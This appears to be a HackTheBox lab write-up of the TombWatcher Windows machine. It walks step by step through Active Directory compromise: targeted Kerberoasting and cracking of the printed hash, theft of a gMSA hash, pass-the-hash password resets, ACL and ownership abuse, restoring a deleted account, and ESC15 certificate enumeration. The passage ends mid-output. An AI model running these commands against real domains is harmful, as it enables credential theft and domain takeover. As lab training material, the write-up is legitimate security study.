---
title: "HTB - TombWatcher Writeup"
date: 2026-11-07 17:00:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
TombWatcher is a medium-difficulty Windows machine that focuses on Active Directory privilege escalation through a chained abuse of domain object permissions. The attack starts with the provided credentials for the user henry, who possesses WriteSPN rights over the account alfred. This access is leveraged to carry out a targeted Kerberoasting attack, allowing the alfred user’s password to be cracked and yielding control over an account that can add itself to the INFRASTRUCTURE group. Being a member of this group allows you to retrieve the gMSA password for the ansible_dev$ managed service account. This account has the privilege to reset the password for the user sam, which becomes the next pivot point. Through the sam user, WriteOwner permissions over the user john are abused to obtain a GenericAll ACE, enabling a password reset and full access to the john user, who is a member of the Remote Management Users group. This provides an interactive shell and access to the user flag. Privilege escalation to Administrator is then achieved by abusing john user’s GenericAll rights over the ADCS organizational unit. A previously deleted account, cert_admin, is restored using the Active Directory Recycle Bin, its password is reset, and it is leveraged to exploit ESC15 against a misconfigured WebServer certificate template. This ultimately allows the issuance of a certificate for Administrator, resulting in full domain compromise.
## P0
First of all, I use rustscan to find out all opened ports:
```
└─$ rustscan -a 10.129.232.167 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.167:53
Open 10.129.232.167:88
Open 10.129.232.167:80
Open 10.129.232.167:135
Open 10.129.232.167:139
Open 10.129.232.167:389
Open 10.129.232.167:445
Open 10.129.232.167:464
Open 10.129.232.167:593
Open 10.129.232.167:636
Open 10.129.232.167:3268
Open 10.129.232.167:3269
Open 10.129.232.167:5985
Open 10.129.232.167:9389
Open 10.129.232.167:49666
Open 10.129.232.167:49695
Open 10.129.232.167:49696
Open 10.129.232.167:49697
Open 10.129.232.167:49716
Open 10.129.232.167:49722
Open 10.129.232.167:49741
10.129.232.167 -> [53,88,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49697,49716,49722,49741]
```
Then I use nmap for getting details about them:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,88,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49697,49716,49722,49741 -oN 10.129.232.167_nmap 10.129.232.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-05 07:52 -0500
Nmap scan report for 10.129.232.167 (10.129.232.167)
Host is up (0.036s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-05 16:51:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-05T16:53:02+00:00; +3h58m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-05T16:53:03+00:00; +3h58m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-05T16:53:02+00:00; +3h58m40s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-11-05T16:53:03+00:00; +3h58m40s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-05T16:52:25
|_  start_date: N/A
|_clock-skew: mean: 3h58m39s, deviation: 0s, median: 3h58m39s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   37.49 ms 10.10.14.1 (10.10.14.1)
2   37.62 ms 10.129.232.167 (10.129.232.167)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.55 seconds
```
## P1 & P2 & A1
This time, I was more alert, so I read the description before getting started. The target machine this time is to contain an actual credentials: **henry : H3nry_987TGV!**

```
└─$ bloodhound-python -u henry@tombwatcher.htb -p H3nry_987TGV! -d tombwatcher.htb -ns 10.129.232.167 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::ffea:6134:1653:c558
INFO: Trying LDAP connection to dead:beef::ffea:6134:1653:c558
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::ffea:6134:1653:c558
INFO: Trying LDAP connection to dead:beef::ffea:6134:1653:c558
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20261106013540_bloodhound.zip
```
As we can see, bloodhound-python only gather information about **users, groups, gpos, ous, containers and trusts**. It misses many others. So I change to use **rusthound**
```
└─$ rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -i 10.129.232.167 -z
---------------------------------------------------
Initializing RustHound-CE at 13:17:00 on 11/09/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-09T18:17:00Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-09T18:17:00Z INFO  rusthound_ce] Collection method: All
[2026-11-09T18:17:00Z INFO  rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!
[2026-11-09T18:17:00Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-09T18:17:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-09T18:17:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
[2026-11-09T18:17:02Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=tombwatcher,DC=htb
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=tombwatcher,DC=htb
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=tombwatcher,DC=htb
[2026-11-09T18:17:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-09T18:17:04Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=tombwatcher,DC=htb
[2026-11-09T18:17:04Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 45%                                                                                                                                                                  [2026-11-09T18:17:04Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                                                           
[2026-11-09T18:17:04Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-11-09T18:17:04Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 78 containers parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-11-09T18:17:04Z INFO  rusthound_ce::json::maker::common] .//20261109131704_tombwatcher-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 13:17:04 on 11/09/26! Happy Graphing!
```
**SharpHound** is the best, but now we do not have interactive shell. So between bloodhound-python and rusthound, **choose rusthound**

![Upgrade_Notice.pdf](assets/image/htb/tombwatcher/2026-11-06_11-06.png){: w="700" }

Thanks to rusthound, we have a long flow before we can achive the **john** account. First of all, we will use **nxc ldap** to exploit **kerberoasting attack** on **alfred** user.

```
└─$ nxc ldap 10.129.232.167 -u "henry" -p 'H3nry_987TGV!' -d tombwatcher.htb --kerberoasting TGS_alfred.txt --targeted-kerberoast "alfred"
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.129.232.167  389    DC01             [+] Found 1 enabled users without SPN.
LDAP        10.129.232.167  389    DC01             [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 11:17:03.526670, lastLogon: <never>
LDAP        10.129.232.167  389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$d3e18ec40e7a80847c38e13fbeede569$0cdc433233e621cd019ce884af27b03315847ddfeca152ea464678f7493381732366ee527c4cdb90550f47272c546b484e76c496ac4de765372cfdc5701d6209c463a1d97c58818764ecd9ab516a9e5415d22d2e180fd6750f752c61e493c7920b10a8602704a6297dd3a504c26be687140586552adf8927810d0737f876d5ad00805eeccc3a1cf69dbca7930fa063a981dd2f9e28491d3d6626878b65452732157fac83ce9c6fba2489dfe7aa48aef589ac35821c885d44c5f5cc0a15ecc75667e7313b2745254aefd757c7c8d341ebe1a4c3eeb622b71fb301774c197def9fd40ecbde12aee2d588ff3cef3fa572dc1cb543acf62c621d7b024ab811d799254285c6510c8137daf33caab1e36dbc9709da860093264b97dfb9f1fc929f811683b39e7b1bdef8578d36fd91f649f61be1e2bd8ce24f8d45d2c46a48038019605c2927e88d0904d68d3671e89d6cfa4a57915e8fd598effff7473933434eed0ffc899bbbbc0483f9cd21c015d2a1cbdbcefea6525847efcc71b166d894f77f0888c3706e62cabefa73cb6a8cb69025b2f567317f1c643ac20885a7fa1ccb2ad4190dcd657732df2a93681095fa0794d5ec8a2abd41f09ff5a29f30a964f2e23231e8e521c8f2fd3f5afa52395119136bde1036343cd409a53c8ba05de5382221e4319ae51ca67217f8a37a5979362b56b521cda78ce630d21dd1895654967d6721af562f50f4ce1b055a9f830d1862844378d76b4661baba1d5f952c58f791199062a512811e84a16136aa2a0c8de15aee16dca15e852474c674a0e262bdd503c3d285531c0d82b42c390b971f72967cb881539100d9c91e1792ecaecd1d49836b90b3c05a76602bdc819576ec5c60d3dfe5f0c70b97da4d28d0e79e7826cb5a98bd6248af767083320488ece64c39cc2ecd6d31d489e7faacb5b6d7e96a86221d64005d234b89e3ace390883068d241dd6e2cefed2ac95f6a81a812720ffc151a3cc0584c2f027aabb897727f67f593d8754191bbea2be18412f56a6051b0c5c9c012b04cc06487567a0f5c42b8cdebfeb3e0589f7bb79bef34c5b75223c816fa780d8d5f98e6c5aee67edea9f870b2a09e8adb10f85b32faed0bbc2a6549046e415c1e22fda7a1003383efec044125bf703c713215e12ac9b17a40aaf2a97d780485d1dcedde2c1846872da4ae58b360e5aa91079329b3c738bf3416ffc45f7b8d44384a501db623000f03301b553c497c06fd7072e12e847c8fe548289f22f43b05868b4adba6d19e1d47d61378f25d1d8365ebde2a05e108f978184b03f980b2ae8848fb2199cda69a6100eae15abf0ec79080f320bf1146dc78f3e714e6f865f38ab35c44b90cbbaedc4861f621bcfe7a63b08285e636ba0f844b3c156611bb5a2f8050079df4576c7e5f6fa6f3b9286fc69e768d7e1d7fa9952e12429c46e834154df3941c0adb219b79f7c95a5dd8403b64708818098fe571f275faa563654de7e7
```

```
.\hashcat.exe -a 0 -m 13100 '$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$d3e18ec40e7a80847c38e13fbeede569$0cdc433233e621cd019ce884af27b03315847ddfeca152ea464678f7493381732366ee527c4cdb90550f47272c546b484e76c496ac4de765372cfdc5701d6209c463a1d97c58818764ecd9ab516a9e5415d22d2e180fd6750f752c61e493c7920b10a8602704a6297dd3a504c26be687140586552adf8927810d0737f876d5ad00805eeccc3a1cf69dbca7930fa063a981dd2f9e28491d3d6626878b65452732157fac83ce9c6fba2489dfe7aa48aef589ac35821c885d44c5f5cc0a15ecc75667e7313b2745254aefd757c7c8d341ebe1a4c3eeb622b71fb301774c197def9fd40ecbde12aee2d588ff3cef3fa572dc1cb543acf62c621d7b024ab811d799254285c6510c8137daf33caab1e36dbc9709da860093264b97dfb9f1fc929f811683b39e7b1bdef8578d36fd91f649f61be1e2bd8ce24f8d45d2c46a48038019605c2927e88d0904d68d3671e89d6cfa4a57915e8fd598effff7473933434eed0ffc899bbbbc0483f9cd21c015d2a1cbdbcefea6525847efcc71b166d894f77f0888c3706e62cabefa73cb6a8cb69025b2f567317f1c643ac20885a7fa1ccb2ad4190dcd657732df2a93681095fa0794d5ec8a2abd41f09ff5a29f30a964f2e23231e8e521c8f2fd3f5afa52395119136bde1036343cd409a53c8ba05de5382221e4319ae51ca67217f8a37a5979362b56b521cda78ce630d21dd1895654967d6721af562f50f4ce1b055a9f830d1862844378d76b4661baba1d5f952c58f791199062a512811e84a16136aa2a0c8de15aee16dca15e852474c674a0e262bdd503c3d285531c0d82b42c390b971f72967cb881539100d9c91e1792ecaecd1d49836b90b3c05a76602bdc819576ec5c60d3dfe5f0c70b97da4d28d0e79e7826cb5a98bd6248af767083320488ece64c39cc2ecd6d31d489e7faacb5b6d7e96a86221d64005d234b89e3ace390883068d241dd6e2cefed2ac95f6a81a812720ffc151a3cc0584c2f027aabb897727f67f593d8754191bbea2be18412f56a6051b0c5c9c012b04cc06487567a0f5c42b8cdebfeb3e0589f7bb79bef34c5b75223c816fa780d8d5f98e6c5aee67edea9f870b2a09e8adb10f85b32faed0bbc2a6549046e415c1e22fda7a1003383efec044125bf703c713215e12ac9b17a40aaf2a97d780485d1dcedde2c1846872da4ae58b360e5aa91079329b3c738bf3416ffc45f7b8d44384a501db623000f03301b553c497c06fd7072e12e847c8fe548289f22f43b05868b4adba6d19e1d47d61378f25d1d8365ebde2a05e108f978184b03f980b2ae8848fb2199cda69a6100eae15abf0ec79080f320bf1146dc78f3e714e6f865f38ab35c44b90cbbaedc4861f621bcfe7a63b08285e636ba0f844b3c156611bb5a2f8050079df4576c7e5f6fa6f3b9286fc69e768d7e1d7fa9952e12429c46e834154df3941c0adb219b79f7c95a5dd8403b64708818098fe571f275faa563654de7e7' ..\own-wordlist\rockyou.txt

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$d3e18ec40e7a80847c38e13fbeede569$0cdc433233e621cd019ce884af27b03315847ddfeca152ea464678f7493381732366ee527c4cdb90550f47272c546b484e76c496ac4de765372cfdc5701d6209c463a1d97c58818764ecd9ab516a9e5415d22d2e180fd6750f752c61e493c7920b10a8602704a6297dd3a504c26be687140586552adf8927810d0737f876d5ad00805eeccc3a1cf69dbca7930fa063a981dd2f9e28491d3d6626878b65452732157fac83ce9c6fba2489dfe7aa48aef589ac35821c885d44c5f5cc0a15ecc75667e7313b2745254aefd757c7c8d341ebe1a4c3eeb622b71fb301774c197def9fd40ecbde12aee2d588ff3cef3fa572dc1cb543acf62c621d7b024ab811d799254285c6510c8137daf33caab1e36dbc9709da860093264b97dfb9f1fc929f811683b39e7b1bdef8578d36fd91f649f61be1e2bd8ce24f8d45d2c46a48038019605c2927e88d0904d68d3671e89d6cfa4a57915e8fd598effff7473933434eed0ffc899bbbbc0483f9cd21c015d2a1cbdbcefea6525847efcc71b166d894f77f0888c3706e62cabefa73cb6a8cb69025b2f567317f1c643ac20885a7fa1ccb2ad4190dcd657732df2a93681095fa0794d5ec8a2abd41f09ff5a29f30a964f2e23231e8e521c8f2fd3f5afa52395119136bde1036343cd409a53c8ba05de5382221e4319ae51ca67217f8a37a5979362b56b521cda78ce630d21dd1895654967d6721af562f50f4ce1b055a9f830d1862844378d76b4661baba1d5f952c58f791199062a512811e84a16136aa2a0c8de15aee16dca15e852474c674a0e262bdd503c3d285531c0d82b42c390b971f72967cb881539100d9c91e1792ecaecd1d49836b90b3c05a76602bdc819576ec5c60d3dfe5f0c70b97da4d28d0e79e7826cb5a98bd6248af767083320488ece64c39cc2ecd6d31d489e7faacb5b6d7e96a86221d64005d234b89e3ace390883068d241dd6e2cefed2ac95f6a81a812720ffc151a3cc0584c2f027aabb897727f67f593d8754191bbea2be18412f56a6051b0c5c9c012b04cc06487567a0f5c42b8cdebfeb3e0589f7bb79bef34c5b75223c816fa780d8d5f98e6c5aee67edea9f870b2a09e8adb10f85b32faed0bbc2a6549046e415c1e22fda7a1003383efec044125bf703c713215e12ac9b17a40aaf2a97d780485d1dcedde2c1846872da4ae58b360e5aa91079329b3c738bf3416ffc45f7b8d44384a501db623000f03301b553c497c06fd7072e12e847c8fe548289f22f43b05868b4adba6d19e1d47d61378f25d1d8365ebde2a05e108f978184b03f980b2ae8848fb2199cda69a6100eae15abf0ec79080f320bf1146dc78f3e714e6f865f38ab35c44b90cbbaedc4861f621bcfe7a63b08285e636ba0f844b3c156611bb5a2f8050079df4576c7e5f6fa6f3b9286fc69e768d7e1d7fa9952e12429c46e834154df3941c0adb219b79f7c95a5dd8403b64708818098fe571f275faa563654de7e7:basketball
```
Then we can use **bloodyAD** to add **alfred** to group **infrasturcture**
```
└─$ bloodyAD -i 10.129.232.167 -d tombwatcher.htb -u alfred -p basketball add groupMember 'infrastructure' 'alfred'
[+] alfred added to infrastructure
```
From there, we can use **alfred** to read gmsa information by continuing using **nxc ldap**:
```
└─$ nxc ldap 10.129.232.167 -u "alfred" -p 'basketball' -d tombwatcher.htb --gmsa 
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: 49ac0e043f08822a1d5ac558277e1cfb     PrincipalsAllowedToReadPassword: Infrastructure
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         aes128-cts-hmac-sha1-96: bbf92f43b0bcaa9a97015455cb43ee63
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         aes256-cts-hmac-sha1-96: c7f14bc2e5a7f81d1450de392c86b42e887ba590d95226a0fe60c11400bf84ea
```
Okey, with **pass-the-Hash** we can change the password for **sam** account.
```
└─$ bloodyAD -i 10.129.232.167 -d tombwatcher.htb -u 'ansible_dev$' -p ':49ac0e043f08822a1d5ac558277e1cfb' set password sam 'NewPassword123!'
[+] Password changed successfully!
```
Now we control **sam** account. Next we will change the owner of **john** object to **sam** account
```
└─$ bloodyAD -i 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'NewPassword123!' set owner 'john' 'sam'                                       
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```
Because now **sam** is owner of **john** object, i can add **genericAll** ACL to it:
```
└─$ bloodyAD -i 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'NewPassword123!' add genericAll 'john' 'sam'            
[+] sam has now GenericAll on john
```
From that we can do anything on **john** object like: change password or Shadow Crendential attack. For easily, I choose changing password :D
```
└─$ bloodyAD -i 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'NewPassword123!' set password john 'NewPassword456!'
[+] Password changed successfully!
```
Now I can use evil-winrm to access to winrm as **john** user.
```
└─$ evil-winrm -i 10.129.232.167 -u john -p NewPassword456!         
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```
And we achive the first flag:
```
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/8/2026  11:41 PM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
```
## P3 & P4 v1
Okey now we have the inital shell on the target. I will continue using my own script to basically enumerate the target
```
*Evil-WinRM* PS C:\Users\john> .\windows-privesc.ps1
```

![Upgrade_Notice.pdf](assets/image/htb/tombwatcher/2026-11-09_15-37.png){: w="700" }

My script detect some objects have been deleted. It is **cert_admin** which belongs to **ADCS** OU.<br>
If you feel to fast :D, we can use **BloodHound** to findout **cert_admin** user.

![Upgrade_Notice.pdf](assets/image/htb/tombwatcher/2026-11-09_20-31.png){: w="700" }

From bloodhound, we can see that template **WebServer** have an indentity which have enrollment assignment. But bloodhound only displays it as SID without UPN. This means this user had been deleted. We can use **Get-ADObject** to query like this:

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter { ObjectSID -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111' } -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```
**cert_admin**, this name looks interesting. Why dont we restore it and abuse to continue exploiting ?<br>
Actually, at first I use **bloodyAD** to restore user but in the end, it created many other weird errors.<br>
```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'NewPassword123!' set restore 'cert_admin'
```
It takes me too much time to watch and read and findout **Restore-AdObject** method:
```
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity S-1-5-21-1392491010-1358638721-2126982587-1111
```
After restoring it, I will change its password for easily to use:
```
└─$ bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'john' -p 'NewPassword456!' set password 'cert_admin' 'NewPassword789!'
[+] Password changed successfully!
```
Now we have all indeed materials, time for using **certipy** to findout any valid **ECS** and boooom, **ECS15**
```
└─$ certipy find -target dc01.tombwatcher.htb -dc-ip 10.129.232.167 -u 'cert_admin' -p 'NewPassword789!' -stdout -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
